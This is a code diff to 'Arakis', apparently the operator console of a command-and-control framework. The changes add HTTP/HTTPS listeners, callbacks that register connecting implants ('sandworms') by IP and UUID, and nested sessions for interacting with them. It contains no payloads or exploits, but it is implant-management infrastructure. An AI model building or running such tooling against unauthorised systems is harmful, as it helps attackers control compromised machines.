@@ -1,10 +1,16 @@
 import cmd
 import logger
 import threading
-from tcp_server import CustomTCPServer
+from listeners.tcp_server import CustomTCPServer
 from colorama import Fore, Style
-from sandworms import TCPSandwormCLI  # Import the nested CLI
-from custom_http import HTTPHandler, HTTPServerWrapper
+from CLI.sandworms import TCPSandwormCLI, HTTPSandwormCLI  # Import the nested CLI
+from listeners.custom_http import HTTPHandler, HTTPServerWrapper
+import signal
+
+
+TEMP_CERT_FILE = "certificates/cert.pem"
+TEMP_KEY_FILE = "certificates/key.pem"
+
 
 class ArakisCLI(cmd.Cmd):
     """
@@ -21,7 +27,7 @@ class ArakisCLI(cmd.Cmd):
         self.tcp_listeners = {} # Indexed by ID, values are a tuple (CustomTCPServer, ID)
         self.tcp_listeners_count = 0
 
-        self.http_listeners = {} # Indexed by ID, values are HTTPServer instances
+        self.http_listeners = {} # Indexed by ID, values are a tuple (HTTPServerWrapper, ID)
         self.http_listeners_count = 0
 
         self.tcp_sandworms = {} # Connected TCP clients
@@ -173,7 +179,7 @@ class ArakisCLI(cmd.Cmd):
         for index, listener_tuple in self.tcp_listeners.items():
             listener = listener_tuple[0]
             self.log.info(f"[{index}] TCP listener on {listener.IP}:{listener.PORT}")
-            print(Fore.YELLOW + f"[{index}] {listener.IP}:{listener.PORT} ({"running" if listener.running else "idle"})" + Style.RESET_ALL)
+            print(Fore.YELLOW + f"[{index}] {listener.IP}:{listener.PORT} ({'running' if listener.running else 'idle'})" + Style.RESET_ALL)
 
 
     def tcp_help(self):
@@ -204,11 +210,38 @@ class ArakisCLI(cmd.Cmd):
         print("  exit                    - Exit the CLI\n")
 
 
-    def handle_http_commands(self):
-        pass
+    def handle_http_commands(self, sub_cmd, args):
+        """
+        wrapper for all tcp related commands. Options : list, create, start, remove, stop.
+        Example: tcp list
+        """
+        if sub_cmd == "list":
+            self.list_http_listeners()
+        
 
+        # TODO juste faire en sorte que de pas devoir spécifier secure, mais https à la place
+        elif sub_cmd == "create":
+            if "secure" in args:
+                self.create_http_listener(args[0], args[1], secure=True)
 
-    def create_http_listener(self, ip, port, secure=False, certfile=None, keyfile=None):
+            else:
+                self.create_http_listener(args[0], args[1], secure=False)
+        
+        elif sub_cmd == "remove" and len(args) == 1:
+            self.remove_http_listener(args[0])
+        
+        elif sub_cmd == "start" and len(args) == 1:
+            self.start_http_listener(args[0])
+        
+        elif sub_cmd == "help":
+            self.http_help()
+
+        else:
+            self.log.error(f"Invalid TCP command. Use: 'tcp help' if needed.")
+            print(Fore.YELLOW + f"[-] Invalid TCP command. " + Style.RESET_ALL + "")
+            print("Use: 'tcp help' if needed.")
+
+    def create_http_listener(self, ip, port, secure=False, certfile=TEMP_CERT_FILE, keyfile=TEMP_KEY_FILE):
         """
         TODO : Pas obligé de spécifier secure si tu donne certfile et keyfile
         http create <interface> <port> <secure> <certfile> <keyfile> - Setup a listening HTTP server
@@ -221,6 +254,8 @@ class ArakisCLI(cmd.Cmd):
             http_listener = HTTPServerWrapper(
                 (interface, port),
                 HTTPHandler,
+                self.on_new_http_sandworm,
+                index,
                 secure,
                 certfile,
                 keyfile
@@ -267,7 +302,7 @@ class ArakisCLI(cmd.Cmd):
         """
         try:
             index = int(index)
-            listener,_ = self.tcp_listeners[index]
+            listener,_ = self.http_listeners[index]
 
             if not listener:
                 self.log.error(f"No HTTP listener found at index {index}")
@@ -283,6 +318,23 @@ class ArakisCLI(cmd.Cmd):
 
         except ValueError:
             self.log.error("Invalid index.")
+
+
+    def list_http_listeners(self):
+        """
+        http list - List all currently configured HTTP listeners
+        Example : http list
+        """
+        if not self.http_listeners:
+            self.log.info("No active HTTP listeners")
+            print(Fore.YELLOW + f"[-] No active HTTP listeners" + Style.RESET_ALL)
+            return
+        
+        print(Fore.GREEN + f"[+] HTTP listener actives :" + Style.RESET_ALL)
+        for index, listener_tuple in self.http_listeners.items():
+            listener = listener_tuple[0]
+            self.log.info(f"[{index}] HTTP listener on {listener.ip}:{listener.port}")
+            print(Fore.YELLOW + f"[{index}] {listener.ip}:{listener.port} ({'running' if listener.running else 'idle'})" + Style.RESET_ALL)
 
 
     ### SANDWORM COMMANDS ###
@@ -316,7 +368,7 @@ class ArakisCLI(cmd.Cmd):
 
         print("[=>} HTTP Sandworms : ")
         for index, client in self.http_sandworms.items():
-            print(Fore.YELLOW + f"[{index}]  Sandworm : {client['username']}@{client['hostname']}" + Style.RESET_ALL)
+            print(Fore.YELLOW + f"[{index}]  Sandworm : {client['sandworm_index']}@{client['ip']}" + Style.RESET_ALL)
 
 
     def interact_with_sandworm(self, index, type="tcp"):
@@ -336,6 +388,16 @@ class ArakisCLI(cmd.Cmd):
                 sandworm_cli.cmdloop() # Start nested CLI
             
             elif type == "http":
+
+                if index not in self.http_sandworms:
+                    self.log.error(f"Sandworm [{index}] not found.")
+                    return
+                
+                sandworm = self.http_sandworms[index]
+                sandworm_cli = HTTPSandwormCLI(index, sandworm, self)
+                sandworm_cli.cmdloop() # Start nested CLI
+            
+            else:
                 pass
 
         except ValueError:
@@ -372,17 +434,19 @@ class ArakisCLI(cmd.Cmd):
 
 
     ### CALLBACK FUNCTION FOR NEW HTTP SANDWORM ###
-    def on_new_http_sandworm(self, index, ip, hostname, username, http_listener_index):
+    def on_new_http_sandworm(self, index, uuid, client_ip, secure, sandworm_index):
         """
         This function is called when a new HTTP sandworm connects
         """
-        print("\n" + Fore.GREEN + f"[+] New Sandworm connected {username}@{hostname}!" + Style.RESET_ALL)
+        print("\n" + Fore.GREEN + f"[+] New Sandworm connected {client_ip}!" + Style.RESET_ALL)
 
         self.http_sandworms[index] = {
-            "ip":ip,
-            "hostname":hostname,
-            "username":username,
-            "http_index":http_listener_index
+            "uuid":uuid,
+            "ip":client_ip,
+            #"hostname":hostname,
+            #"username":username,
+            "secure":secure,
+            "sandworm_index":sandworm_index
         }
 
     
@@ -436,6 +500,30 @@ class ArakisCLI(cmd.Cmd):
         """
         print("Exiting Arakis CLI. - " + Fore.CYAN + " May Thy Knife Chip & Shatter!" + Style.RESET_ALL)
         return True
+    
+
+    def stop_listeners(self):
+        """
+        Stop all listeners
+        """
+        for _, listener in self.tcp_listeners.items():
+            listener[0].stop()
+        
+        for _, listener in self.http_listeners.items():
+            listener[0].stop()
+
+
+    def signal_handler(self, sig, frame):
+        """
+        Handle SIGINT signal
+        """
+        self.stop_listeners()
+        self.do_exit(None)
+
+
+    def run(self):
+        signal.signal(signal.SIGINT, self.signal_handler)
+        self.cmdloop()
             
 """ TODO
 
@@ -473,4 +561,4 @@ IMPORTANT :
 
 """
 if __name__ == '__main__':
-    ArakisCLI().cmdloop()
+    ArakisCLI().run()
